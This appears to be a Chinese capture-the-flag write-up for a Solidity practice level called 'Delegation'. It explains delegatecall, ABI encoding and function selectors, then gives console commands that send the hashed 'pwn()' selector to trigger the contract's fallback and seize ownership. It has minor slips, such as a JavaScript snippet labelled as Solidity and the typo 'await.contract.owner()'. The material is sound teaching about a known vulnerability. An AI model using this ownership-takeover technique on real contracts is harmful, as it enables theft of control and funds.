### 第六题 Delegation
### 题目
获得合约的所有权.
### 提示
- 仔细看solidity文档关于 delegatecall 的低级函数, 他怎么运行的, 他如何将操作委托给链上库, 以及他对执行的影响.
- Fallback 方法
- 方法 ID
### 源码
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Delegate {
    address public owner;
    constructor(address _owner) {
        owner = _owner;
    }
    //将合约的拥有者地址设置为调用者的地址
    function pwn() public {
        owner = msg.sender;
    }
}

contract Delegation {
    address public owner;
    // delegate 是一个 Delegate 合约的实例
    Delegate delegate;

    constructor(address _delegateAddress) {
        delegate = Delegate(_delegateAddress);
        owner = msg.sender;
    }

    //回退函数，当调用的函数不存在时会被触发。它使用delegatecall将调用委托给delegate合约。
    fallback() external {
        //address(delegate) 将该变量转换为 address 类型
        //msg.data 是当前调用的数据负载（calldata），包含了函数选择器和参数。它通常用于将调用的输入         //数据传递给目标合约。      
        (bool result,) = address(delegate).delegatecall(msg.data);
        if (result) {
            //this 关键字指代当前合约,但不会执行任何操作
            this;
        }
    }
}
```
### 知识点
#### 1.delegatecall 
 Delegatecall 是本地合约委托调用其它合约的一种 Low-level 方法。当 A 合约使用 delegatecall 调用 B 合约的某 function，所有执行时的资料、状态改变都发生在 A 合约 storage 内而非 B 合约。相当于把B合约的所有函数复制到A合约，使用和修改的都是A合约的数据。
工作原理：  
- 上下文共享：被调用合约（B）的代码在调用合约（A）的上下文中执行。这意味着所有的状态变量修改都发生在 A 合约的存储中，而不是 B 合约的存储中。
- msg.sender 和 msg.value 不变：调用合约的 msg.sender 和 msg.value 保持不变，这意味着调用者的信息不会改变。
注意事项：  
- 存储布局：调用合约和被调用合约的存储布局必须一致，否则可能会导致意外的行为。  
- 安全性：由于 delegatecall 允许被调用合约修改调用合约的状态，因此在使用时需要特别小心，以防止潜在的安全漏洞。  
delegatecall和call的区别：  
- 当用户A通过合约B来call合约C的时候，执行的是合约C的函数，上下文(Context，可以理解为包含变量和状态的环境)也是合约C的：msg.sender是B的地址，并且如果函数改变一些状态变量，产生的效果会作用于合约C的变量上。   

- 而当用户A通过合约B来delegatecall合约C的时候，执行的是合约C的函数，但是上下文仍是合约B的：msg.sender是A的地址，并且如果函数改变一些状态变量，产生的效果会作用于合约B的变量上。  

可以这样理解：一个投资者（用户A）把他的资产（B合约的状态变量）都交给一个风险投资代理（C合约）来打理。执行的是风险投资代理的函数，但是改变的是资产的状态。
delegatecall语法和call类似，也是：  
目标合约地址.delegatecall(二进制编码);  
其中二进制编码利用结构化编码函数abi.encodeWithSignature获得：  
abi.encodeWithSignature("函数签名", 逗号分隔的具体参数)  
函数签名为"函数名（逗号分隔的参数类型）"。例如abi.encodeWithSignature("f(uint256,address)", _x, _addr)。  
资料来源https://github.com/AmazingAng/WTF-Solidity/tree/main/23_Delegatecall
#### 2.ABI编码  
https://github.com/AmazingAng/WTF-Solidity/tree/main/27_ABIEncode
#### 3.函数选择器 (Function Selector)  
https://github.com/AmazingAng/WTF-Solidity/tree/main/29_Selector
#### 4.sendTransaction
sendTransaction函数可以用来发送以太币或调用智能合约中的函数。它的基本语法如下：  
```solidity
address.sendTransaction({
    from: senderAddress,  //from: 发送交易的地址  
    to: receiverAddress, //to: 接收交易的地址，可以是一个普通地址或智能合约地址。  
    value: amountInWei, // value: 发送的以太币数量，以Wei为单位。  
    gas: gasLimit,      // gas: 交易的最大Gas限制。  
    gasPrice: gasPriceInWei, // gasPrice: 每单位Gas的价格，以Wei为单位。  
    data: encodedFunctionCall // data: 要调用的函数及其参数的编码数据。  
});
```
### 解题思路
- 使用delegatecall调用delegate合约的pwn函数  
- 而delegatecall在fallback函数里，需要想办法来触发它  
- 只要直接调用Delegation合约，给予正确的calldata abi.encodeWithSignature("pwn()")，会因为找不到函数而进入回退函数，进而使用delegatecall(msg.data)调用Delegate 合约的 pwn() ，  
### 解题过程
1.获取实例
2.``var callData = web3.utils.keccak256("pwn()")`` // 准备好callData  
3.``contract.sendTransaction({data:callData});`` // 使用封装好的sendTransaction来发送data  
4.``await.contract.owner()`` //检查合约的owner  
5.提交  
